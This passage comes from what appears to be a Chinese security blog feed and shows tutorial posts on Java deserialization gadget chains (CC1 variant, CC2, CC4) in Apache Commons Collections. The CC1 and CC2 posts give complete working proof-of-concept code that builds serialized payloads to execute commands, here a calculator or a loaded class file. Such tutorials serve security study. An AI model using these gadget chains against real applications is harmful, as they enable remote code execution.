class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> var2.getName();<br>        Class[] var5 = var2.getParameterTypes();<br>        <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);          <span class="hljs-comment">//不要调用equals，不然直接return</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var5.length != <span class="hljs-number">0</span>) &#123;     <span class="hljs-comment">//判断参数是否为空，如果不为空，则抛出异常</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">switch</span> (var4) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.toStringImpl();<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hashCodeImpl();<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.type;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.get(var4);<br>                    <span class="hljs-keyword">if</span> (var6 == <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(<span class="hljs-built_in">this</span>.type, var4);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var6 <span class="hljs-keyword">instanceof</span> ExceptionProxy) &#123;<br>                        <span class="hljs-keyword">throw</span> ((ExceptionProxy)var6).generateException();<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="hljs-number">0</span>) &#123;<br>                            var6 = <span class="hljs-built_in">this</span>.cloneArray(var6);<br>                        &#125;<br><br>                        <span class="hljs-keyword">return</span> var6;<br>                    &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>也就是说，我们需要调用memberValues无参构造。</p><p>巧合的是，AnnotationInvocationHandler的readObject方法里的memberValues就是无参方法。</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%A6%E4%B8%80%E6%9D%A1CC1%E9%93%BE/image-20240417213150927.png" alt="image-20240417213150927"></p><hr style="border: 1px solid black;"/><p>看一下lazymap的decorate方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>那map还是放之前的hashmap，Transformer就放chainedTransformer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><p>动态代理一个map：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructorhandler</span> <span class="hljs-operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);<br>constructorhandler.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructorhandler.newInstance(Override.class,lazyMap);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">proxyedMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><p>最后把这个代理给AnnotationInvocationHandler的readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructorhandler.newInstance(Override.class,proxyedMap);<br></code></pre></td></tr></table></figure><h1 id="最终poc："><a href="#最终poc：" class="headerlink" title="最终poc："></a>最终poc：</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1_other</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//序列化InvokerTransformer，反射调用exec函数执行命令。</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-comment">//动态代理</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructorhandler</span> <span class="hljs-operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);<br>        constructorhandler.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructorhandler.newInstance(Override.class,lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyedMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> constructorhandler.newInstance(Override.class,proxyedMap);<br><br>        serialize(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——CC2链</title>
    <link href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/"/>
    <url>/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>详细请看CC4链。CC2链跟CC4链几乎一样，就是在CC4利用InstantiateTransformer类的基础上改成了直接使用InvokerTransformer，其他没变。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">CC4：<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">CC2：<br>InvokerTransformer&lt;Object,Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br></code></pre></td></tr></table></figure><p>然后把TemplatesImpl类的对象从传入InstantiateTransformer改成直接add进priorityQueue里。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">CC4：<br>priorityQueue.add(<span class="hljs-number">1</span>);<br>CC2：<br>priorityQueue.add(templates);<br></code></pre></td></tr></table></figure><p>其他没变。</p><h2 id="CC2链完整poc："><a href="#CC2链完整poc：" class="headerlink" title="CC2链完整poc："></a>CC2链完整poc：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();    <span class="hljs-comment">//TemplatesImpl类可以序列化，直接new</span><br>        <span class="hljs-comment">//反射修改类的属性_name</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改类的属性_bytecodes</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));   <span class="hljs-comment">//构建一维byte数组，为了适应defineClass接收的参数，并从文件里读byte</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <span class="hljs-comment">//把一维byte数组变成二维的交给_bytecodes</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates,codes);<br><br>        InvokerTransformer&lt;Object,Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> t.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator,invokerTransformer);<br><br>        serialize(priorityQueue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——CC4链</title>
    <link href="/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/"/>
    <url>/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p>新依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><hr style="border: 1px solid black;"/><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>后半段是CC3的后半段，利用transformer代码执行。我们需要找到新的调用transform函数的方法。</p><p>由于TransformingComparator类在commons-collections3没有实现序列化接口，而commons-collections4实现了，所以才有CC4链的存在。</p><h1 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h1><p>CC4链主要利用的是TransformingComparator类里的compare方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object obj1, Object obj2)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法里调用了transform方法。接下来往回找，谁调用了compare方法。</p><p>在PriorityQueue类里的siftDownUsingComparator方法调用了compare方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>    …………<br>        <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>…………   <br>        &#125;<br></code></pre></td></tr></table></figure><p>顺着链子继续找，在本类的siftDown方法调用了siftDownUsingComparator方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>顺着链子继续找，在本类的heapify方法调用了siftDown方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        siftDown(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>顺着链子继续找，在本类的readObject方法调用了heapify方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>…………<br>    heapify();<br>&#125;<br></code></pre></td></tr></table></figure><p>所以整条链子是这样的：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">在PriorityQueue中：<br><span class="hljs-function"><span class="hljs-title">readObject</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">heapify</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">siftDown</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">siftDownUsingComparator</span>-&gt;</span>TransformingComparator类的compare……<br></code></pre></td></tr></table></figure><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/image-20240417185120263.png" alt="image-20240417185120263"></p><h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>PriorityQueue类是可序列化的，我们直接new，然后把相应的对象传进去就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br></code></pre></td></tr></table></figure><p>但是仅仅这样还是不能触发反序列化，我们进入调试：</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/image-20240417191714591.png" alt="image-20240417191714591"></p><p>原因是在heapify方法里size为零，不能进入siftDown方法，直接出去了。</p><p>这里有两个方法：</p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>反射修改size，让size等于2。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">priorityQueueClass</span> <span class="hljs-operator">=</span> priorityQueue.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">sizeField</span> <span class="hljs-operator">=</span> priorityQueueClass.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>sizeField.setAccessible(<span class="hljs-literal">true</span>);<br>sizeField.set(priorityQueue,<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><h4 id="修改size的poc："><a href="#修改size的poc：" class="headerlink" title="修改size的poc："></a>修改size的poc：</h4><figure class="highlight java"><table><tr><td 